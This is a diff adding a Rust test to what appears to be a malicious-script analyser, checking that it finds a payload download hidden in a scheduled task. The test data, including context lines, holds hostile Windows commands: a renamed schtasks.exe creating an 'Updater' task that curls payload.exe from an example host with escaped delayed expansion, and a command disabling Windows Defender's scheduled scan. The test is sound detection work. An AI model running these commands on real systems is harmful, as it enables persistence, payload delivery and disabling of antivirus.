@@ -3529,6 +3529,26 @@ C:\Users\Public\st.tmp /create /tn "Updater" /tr "cmd /c curl -o out.exe https:/
     }
 
     #[test]
+    fn copied_schtasks_alias_comspec_tr_preserves_escaped_delayed_expansion() {
+        let script = br#"copy C:\Windows\System32\schtasks.exe C:\Users\Public\st.tmp
+C:\Users\Public\st.tmp /create /tn Updater /tr "%COMSPEC% /V:ON /c set U=https://copied-schtasks-delayed.example/payload.exe&&curl -o payload.exe ^!U^!" /sc once /st 00:00 /f
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://copied-schtasks-delayed.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "copied schtasks delayed action download missing: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn copied_schtasks_alias_emits_defender_task_disable_evasion_trait() {
         let script = br#"copy C:\Windows\System32\schtasks.exe C:\Users\Public\st.tmp
 C:\Users\Public\st.tmp /Change /TN "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /Disable
